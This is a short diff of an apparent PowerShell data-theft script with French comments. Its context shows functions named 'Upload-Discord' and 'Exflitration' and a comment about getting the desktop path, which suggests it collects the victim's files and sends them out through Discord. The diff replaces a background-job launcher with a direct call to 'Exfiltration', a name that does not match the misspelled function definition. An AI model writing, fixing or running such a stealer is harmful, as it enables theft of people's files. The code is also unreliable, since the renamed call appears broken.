@@ -21,11 +21,6 @@ function Upload-Discord {
     }
 }
 
-# Créer un scriptblock pour la fonction Exfiltration
-$ExfiltrationScript = {
-    Exfiltration
-}
-
 # Fonction Exfiltration
 function Exflitration {
     # Get desktop path
@@ -117,8 +112,5 @@ function Exflitration {
         exit
     }
     
-# Lancer la fonction Exfiltration en arrière-plan
-$ExfiltrationJob = Start-Job -ScriptBlock $ExfiltrationScript
-
-# Fermer le job
-Remove-Job $ExfiltrationJob
+# Lancer la fonction Exfiltration 
+Exfiltration
